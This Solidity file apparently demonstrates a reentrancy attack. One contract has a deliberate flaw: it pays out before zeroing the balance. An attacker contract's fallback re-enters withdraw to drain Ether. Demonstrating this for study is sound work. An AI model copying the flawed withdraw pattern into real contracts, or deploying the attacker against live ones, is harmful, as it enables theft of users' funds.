// SPDX-License-Identifier: MIT

/** 
    This contract receives funding from different accounts and allows an account 
    to withdraw its own balance. 
**/

pragma solidity ^0.8.0;

contract ReentrancyVulnerableContract {
    mapping(address => uint) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawMyBalance() public payable {
        // Gets the address that is withdrawing money and the balance for that account
        address to = msg.sender;
        uint myBalance = balances[msg.sender];

        // Validates the balance, sends the money to the account, and resets the balance for that account
        if (myBalance > 0) {
            (bool success, ) = to.call{value: myBalance}("");
            require(success, "Transfer failed.");
            balances[msg.sender] = 0;
        }
    }
}

contract ReentrancyAttacker {
    // Fallback function that is called when receiving Ether. It allows the reentrancy attack
    receive() external payable {
        // Gets the address of the contract calling this fallback function and its balance
        address vulnerableAddress = msg.sender;
        uint vulnerableBalance = vulnerableAddress.balance;

        // Gets the contract and attacks it
        ReentrancyVulnerableContract vulnerableContract = ReentrancyVulnerableContract(
                vulnerableAddress
            );

        if (vulnerableBalance >= 1 ether) {
            vulnerableContract.withdrawMyBalance();
        }
    }

    function attack(address vulnerableContractAddress) public payable {
        // Deposits a small amount of Ether
        ReentrancyVulnerableContract(vulnerableContractAddress).depositFunds{
            value: msg.value
        }();

        // Withdraws the balance that was just deposited
        ReentrancyVulnerableContract(vulnerableContractAddress)
            .withdrawMyBalance();
    }
}
